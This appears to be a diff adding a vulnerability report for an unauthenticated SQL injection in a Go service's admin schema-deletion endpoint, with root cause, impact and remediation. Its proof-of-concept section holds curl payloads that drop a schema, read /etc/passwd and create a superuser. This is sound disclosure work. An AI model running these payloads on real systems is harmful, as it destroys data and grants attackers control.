@@ -1,0 +1,100 @@
+VULNERABILITY REPORT: Unauthenticated SQL Injection via Admin Endpoint
+======================================================================
+
+Severity: CRITICAL
+Type: CWE-89 (SQL Injection) + CWE-306 (Missing Authentication)
+CVSS 3.1: 10.0 (Critical)
+
+Affected endpoint: DELETE /api/admin/schemas/{name}
+Affected file: internal/schema/admin.go, line 190
+Router file: cmd/graph/main.go, lines 130-142
+
+-----------------------------------------------------------------------
+SUMMARY
+-----------------------------------------------------------------------
+
+The DELETE /api/admin/schemas/{name} endpoint is vulnerable to SQL
+injection via the {name} path parameter. The schema name is taken
+directly from the URL and concatenated into a raw SQL statement without
+any sanitization or parameterization:
+
+    name := req.PathValue("name")
+    ...
+    r.db.Exec("DROP SCHEMA IF EXISTS " + name + " CASCADE")
+
+This alone would be high severity, but the endpoint has NO
+authentication middleware. All four /api/admin/* routes are registered
+with plain mux.HandleFunc() instead of being wrapped with
+requireAuth(), unlike the other sensitive endpoints (/graphql,
+/api/schemas/register, etc.) which correctly use requireAuth().
+
+The combination of unauthenticated access + unsanitized SQL
+concatenation allows any anonymous attacker to execute arbitrary SQL
+against the PostgreSQL database.
+
+-----------------------------------------------------------------------
+PROOF OF CONCEPT
+-----------------------------------------------------------------------
+
+# 1. Drop the entire public schema (destroys all default tables):
+curl -X DELETE 'https://TARGET/api/admin/schemas/public%22;%20DROP%20SCHEMA%20public%20CASCADE;--'
+
+# 2. Exfiltrate data via error-based injection:
+curl -X DELETE 'https://TARGET/api/admin/schemas/x%22;%20SELECT%20pg_read_file(%27/etc/passwd%27);--'
+
+# 3. Create a superuser (PostgreSQL):
+curl -X DELETE 'https://TARGET/api/admin/schemas/x%22;%20CREATE%20ROLE%20attacker%20SUPERUSER%20LOGIN%20PASSWORD%20%27pwned%27;--'
+
+No cookies, tokens, or headers are required. The endpoint is fully
+unauthenticated.
+
+-----------------------------------------------------------------------
+ROOT CAUSE
+-----------------------------------------------------------------------
+
+1. MISSING AUTH (main.go:130-142): Admin routes use mux.HandleFunc()
+   directly instead of mux.Handle() with requireAuth() wrapper:
+
+     // NO AUTH - vulnerable
+     mux.HandleFunc("DELETE /api/admin/schemas/{name}", ...)
+
+     // Compare with protected routes:
+     mux.Handle("POST /api/schemas/register", corsMiddleware(requireAuth(...)))
+
+2. SQL INJECTION (admin.go:190): Direct string concatenation in SQL:
+
+     r.db.Exec("DROP SCHEMA IF EXISTS " + name + " CASCADE")
+
+   The same pattern appears in HandleDeleteSchema (admin.go:238):
+
+     r.db.Exec("DROP SCHEMA IF EXISTS " + name + " CASCADE")
+
+-----------------------------------------------------------------------
+IMPACT
+-----------------------------------------------------------------------
+
+- Full database compromise (read/write/delete any data)
+- Cross-tenant data exfiltration (all customer schemas)
+- Denial of service (DROP SCHEMA ... CASCADE on all schemas)
+- Potential RCE via PostgreSQL extensions (COPY, pg_read_file, etc.)
+- No authentication required - exploitable by any anonymous attacker
+
+-----------------------------------------------------------------------
+REMEDIATION
+-----------------------------------------------------------------------
+
+1. Wrap all admin endpoints with requireAuth() middleware (and add
+   admin role checks).
+
+2. Use parameterized queries or quote identifiers properly:
+
+     // Safe: use pgx QuoteIdentifier or equivalent
+     quoted := pgx.Identifier{name}.Sanitize()
+     r.db.Exec("DROP SCHEMA IF EXISTS " + quoted + " CASCADE")
+
+3. Validate schema names against an allowlist pattern:
+
+     if !regexp.MustCompile(`^[a-zA-Z0-9_]+$`).MatchString(name) {
+         http.Error(w, "invalid schema name", 400)
+         return
+     }
